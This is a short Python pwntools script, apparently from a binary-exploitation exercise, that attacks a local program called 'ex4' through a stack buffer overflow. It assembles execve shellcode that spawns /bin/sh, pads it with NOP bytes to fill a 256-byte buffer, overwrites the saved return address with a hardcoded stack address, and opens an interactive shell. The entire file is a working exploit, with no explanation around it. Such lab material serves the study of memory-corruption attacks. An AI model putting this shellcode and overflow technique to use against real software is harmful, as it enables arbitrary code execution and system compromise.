#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
io = gdb.debug(
    "./bin/ex4",
    """
    break main
    continue
    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)

target = process("./bin/ex4")

filler = asm("NOP")
buffer_addr = 0x7fffffffdf30
buffer_size = 256

shellcode = (
    asm(
        """
    jmp $+18
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    add rax, 59
    syscall
    call $-16
    """
    )
    + b"/bin/sh\x00"
)

return_addr = buffer_addr

print(buffer_size - len(shellcode))
payload = (
    shellcode + filler * (buffer_size - len(shellcode)) + filler * 8 + p64(return_addr)
)
io.sendline(payload)
io.interactive()
